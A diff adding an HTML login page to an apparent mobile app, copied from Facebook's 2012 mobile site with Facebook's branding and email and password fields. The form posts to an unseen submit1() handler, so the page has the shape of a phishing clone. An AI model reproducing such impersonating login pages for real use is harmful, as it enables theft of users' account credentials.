@@ -1,0 +1,94 @@
+<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>ProjectName</title>
+<meta name="description"
+	content="Facebook helps you connect and share with the people in your life.">
+<meta name="referrer" content="default" id="meta_referrer">
+<meta http-equiv="X-Frame-Options" content="deny" />
+<script type="text/javascript" src="jquery.mobile/jquery-1.7.2.min"></script>
+<script type="text/javascript" src="jquery.mobile/jquery.mobile-1.1.0.js"></script>
+<script type="text/javascript" src="js/login.js"></script>
+<script>
+    function onBodyLoad() {		
+        document.addEventListener("deviceready",onDeviceReady,false);
+    }
+</script>
+<script type="text/javascript">window.localStorage&&window.localStorage.clear();</script>
+<link rel="stylesheet" href="styles/login.css" type="text/css">
+</head>
+<body class="nontouch acw" onload="onBodyLoad()">
+	<div class="mfsm">
+		<div id="viewport" class="mBasicOnDesktop">
+			<div id="root" class="acw">
+				<div class="acb aps" id="header">
+					<a href="http://m.facebook.com/home.php?refid=8"><img
+						class="img img" src="images/logo.png"
+						alt="facebook" height="20" width="76"></a>
+				</div>
+				<div id="objects_container">
+					<div class="aclb">
+						<div class="loginInner">
+							<form class="mobile-login-form" id="login_form" method="post" onsubmit="submit1();">								
+								<div>
+									<div
+										class="mobile-login-field mobile-login-field-email aclb apl">
+										<div>
+											Email or Phone<br>
+											<input id="email" class="input" name="email" type="text">
+										</div>
+									</div>
+									<div class="mobile-login-field aclb apl">
+										<div>
+											Password<br>
+											<input id="password" class="input" name="password" type="password">
+										</div>
+									</div>
+								</div>
+								<div class="aclb apl">
+									<input id="btnLogin" value="Log In" name="btnLogin" class="btn btnC" type="submit" >
+								</div>								
+							</form>
+							<div class="aclb apl">
+								<span class="mfss fcg"><a
+									href="http://m.facebook.com/recover?refid=8">Forgot
+										password?</a><br>Trouble logging in? <a
+									href="http://m.facebook.com/login.php?http&amp;refsrc=http%3A%2F%2Fm.facebook.com%2F&amp;no_next_msg&amp;refid=8">Try
+										the alternative login</a>.</span>
+							</div>
+							<div class="aclb apl abt">
+								<span class="mfss fcg">Need a Facebook account?<br>
+									<a href="http://m.facebook.com/r.php?refid=8">Sign up here</a>.
+								</span>
+							</div>
+						</div>
+					</div>
+					<div class="acw apm">
+						<span class="mfss"><a
+							href="http://m.facebook.com/help/?refid=8">Help Center</a></span>
+					</div>
+					<script type="text/javascript">if(window.document&&document.getElementById){document.getElementById("ajax").value=window.XMLHttpRequest&&document.getElementById("login_form").innerHTML?1:0;document.getElementById("width").value=window.screen?screen.width:0;document.getElementById("pxr").value=window.devicePixelRatio||1;document.getElementById("gps").value=navigator.geolocation||(typeof GearsFactory != "undefined")||(typeof navigator.mimeTypes!="undefined"&&navigator.mimeTypes["application/x-googlegears"])?1:0;}</script>
+				</div>
+				<div id="footer">
+					<div class="acg apm">
+						<span class="mfss fcg"><b>English (US)</b>&nbsp;<span>·</span>&nbsp;<a
+							class="sec"
+							href="http://m.facebook.com/a/language.php?l=vi_VN&amp;lref=http%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQA3_t_HW2fAKzoF&amp;refid=8">Tiếng
+								Việt</a>&nbsp;<span>·</span>&nbsp;<a class="sec"
+							href="http://m.facebook.com/a/language.php?l=es_LA&amp;lref=http%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQD28mdu19R_4ouf&amp;refid=8">Español</a>&nbsp;<span>·</span>&nbsp;<a
+							class="sec"
+							href="http://m.facebook.com/language.php?n=http%3A%2F%2Fm.facebook.com%2F&amp;refid=8">More…</a></span>
+					</div>
+					<div class="acg apm">
+						<span class="mfss fcg">Facebook ©2012</span>
+					</div>
+				</div>
+			</div>
+		</div>
+		<input id="m_user_DEPRECATED" value="0" type="hidden">
+		<div id="static_templates"></div>
+	</div>
+	<div id="output"></div>
+</body>
+</html>
